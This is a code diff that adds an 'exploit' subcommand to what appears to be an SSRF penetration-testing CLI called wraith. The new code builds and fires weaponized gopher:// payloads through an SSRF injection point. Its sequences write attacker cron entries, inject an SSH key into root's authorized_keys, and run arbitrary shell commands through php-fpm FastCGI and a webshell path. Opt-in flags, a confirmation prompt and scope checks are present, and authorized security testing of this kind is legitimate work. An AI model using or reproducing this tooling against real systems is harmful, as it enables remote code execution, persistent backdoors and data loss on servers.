@@ -251,6 +251,98 @@ def build_parser() -> argparse.ArgumentParser:
     )
     gopher.set_defaults(handler=_cmd_gopher)
 
+    # -- exploit: weaponized gopher:// sequences (--exploit gate required) ----
+    exploit = sub.add_parser(
+        "exploit",
+        help="fire weaponized gopher:// sequences (--exploit gate required)",
+        description=(
+            "Fire weaponized gopher:// exploit sequences (Redis cron/SSH injection, "
+            "FastCGI php-fpm RCE) through an SSRF injection point. "
+            "Requires the explicit --exploit flag to opt in. "
+            "Prints a confirmation prompt to stderr unless --yes/-y is passed. "
+            "Authorized testing only."
+        ),
+        epilog=(
+            "Warning: --exploit fires live attack payloads that may cause remote "
+            "code execution, data loss (FLUSHALL), or privilege escalation. "
+            "You are responsible for your scope and authorization."
+        ),
+    )
+    exploit.add_argument(
+        "--exploit",
+        action="store_true",
+        default=False,
+        dest="exploit_gate",
+        help=(
+            "explicit required opt-in flag; the exploit subcommand exits with "
+            "an error unless --exploit is present on the command line"
+        ),
+    )
+    exploit.add_argument(
+        "-y", "--yes",
+        action="store_true",
+        default=False,
+        dest="yes",
+        help="skip the confirmation prompt (for scripted/CI use)",
+    )
+    exploit.add_argument(
+        "--sequence",
+        choices=("redis-cron", "redis-ssh", "fastcgi-rce"),
+        required=True,
+        metavar="SEQ",
+        help="exploit sequence: redis-cron | redis-ssh | fastcgi-rce",
+    )
+    exploit.add_argument(
+        "--host",
+        default="127.0.0.1",
+        help="internal Redis/FastCGI host to target (default: 127.0.0.1)",
+    )
+    exploit.add_argument(
+        "--port",
+        type=int,
+        help="internal port (default: 6379 for redis-*, 9000 for fastcgi-rce)",
+    )
+    exploit.add_argument(
+        "--double-encode",
+        action="store_true",
+        dest="double_encode",
+        help="URL-encode the gopher payload twice",
+    )
+    exploit.add_argument(
+        "--exploit-redis-cron-dir",
+        default="/etc/cron.d/",
+        metavar="DIR",
+        dest="redis_cron_dir",
+        help="cron drop dir for redis-cron (default: /etc/cron.d/)",
+    )
+    exploit.add_argument(
+        "--exploit-redis-cron-entry",
+        metavar="ENTRY",
+        dest="redis_cron_entry",
+        help="cron entry line(s) to inject (required for redis-cron)",
+    )
+    exploit.add_argument(
+        "--exploit-redis-ssh-key",
+        metavar="PUBKEY",
+        dest="redis_ssh_key",
+        help="SSH public key to inject into /root/.ssh/authorized_keys (required for redis-ssh)",
+    )
+    exploit.add_argument(
+        "--exploit-fcgi-cmd",
+        metavar="CMD",
+        dest="fcgi_cmd",
+        help="shell command to execute via the PHP webshell (required for fastcgi-rce)",
+    )
+    exploit.add_argument(
+        "--exploit-fcgi-webshell-path",
+        default="/var/www/html/shell.php",
+        metavar="PATH",
+        dest="fcgi_webshell_path",
+        help="SCRIPT_FILENAME for the FastCGI request (default: /var/www/html/shell.php)",
+    )
+    _add_target_group(exploit)
+    exploit.set_defaults(handler=_cmd_exploit)
+
     return parser
 
 
@@ -412,6 +504,119 @@ def _cmd_gopher(args: argparse.Namespace) -> int:
         f"double_encode={args.double_encode}"
     )
     print(payload)
+    return 0
+
+
+def _cmd_exploit(args: argparse.Namespace) -> int:
+    """Fire a weaponized gopher:// exploit sequence (v0.2, --exploit gate)."""
+    import sys
+
+    # Gate: --exploit must be explicitly present on the CLI.
+    if not args.exploit_gate:
+        print(
+            "error: --exploit is required to fire weaponized sequences "
+            "(this fires live attack payloads that may cause RCE). "
+            "Pass --exploit to opt in.",
+            file=sys.stderr,
+        )
+        return 2
+
+    # Confirmation prompt (skipped by --yes/-y for scripted/CI use).
+    if not args.yes:
+        print(
+            "Warning: --exploit fires live attack payloads that may cause "
+            "remote code execution. Are you sure? [y/N] ",
+            end="",
+            file=sys.stderr,
+            flush=True,
+        )
+        try:
+            answer = input()
+        except (EOFError, KeyboardInterrupt):
+            answer = ""
+        if answer.strip().lower() not in ("y", "yes"):
+            print("Aborted.", file=sys.stderr)
+            return 1
+
+    from wraith.exploit import fastcgi_rce_payload, redis_cron_payload, redis_ssh_payload
+
+    seq = args.sequence
+    host = args.host
+    double_encode = args.double_encode
+
+    if seq == "redis-cron":
+        port = args.port or 6379
+        if not args.redis_cron_entry:
+            print(
+                "error: --exploit-redis-cron-entry is required for the redis-cron sequence",
+                file=sys.stderr,
+            )
+            return 2
+        payload = redis_cron_payload(
+            host,
+            port,
+            args.redis_cron_dir,
+            args.redis_cron_entry,
+            double_encode=double_encode,
+        )
+    elif seq == "redis-ssh":
+        port = args.port or 6379
+        if not args.redis_ssh_key:
+            print(
+                "error: --exploit-redis-ssh-key is required for the redis-ssh sequence",
+                file=sys.stderr,
+            )
+            return 2
+        payload = redis_ssh_payload(
+            host,
+            port,
+            args.redis_ssh_key,
+            double_encode=double_encode,
+        )
+    else:  # fastcgi-rce
+        port = args.port or 9000
+        if not args.fcgi_cmd:
+            print(
+                "error: --exploit-fcgi-cmd is required for the fastcgi-rce sequence",
+                file=sys.stderr,
+            )
+            return 2
+        payload = fastcgi_rce_payload(
+            host,
+            port,
+            args.fcgi_cmd,
+            webshell_path=args.fcgi_webshell_path,
+            double_encode=double_encode,
+        )
+
+    print("# wraith exploit payload (WEAPONIZED -- fires live attack sequence)")
+    print(f"# sequence={seq} host={host} port={port}")
+    print(payload)
+
+    # Optional: fire through an SSRF injection point (scope-enforced).
+    if args.target:
+        import asyncio
+
+        from wraith.client import get_client
+        from wraith.engine import Target
+
+        scope = _load_scope_or_exit(args.scope_file)
+        if scope is None:
+            return 2
+
+        target_obj = Target.from_url(args.target, marker=args.marker, param=args.param)
+        method, url, headers, body = target_obj.build_request(payload)
+
+        async def _fire() -> None:
+            client = get_client(scope)
+            try:
+                resp = await client.request(method, url, headers=headers or None, content=body)
+                print(f"# fired: HTTP {resp.status_code}", file=sys.stderr)
+            finally:
+                await client.aclose()
+
+        asyncio.run(_fire())
+
     return 0
 
 
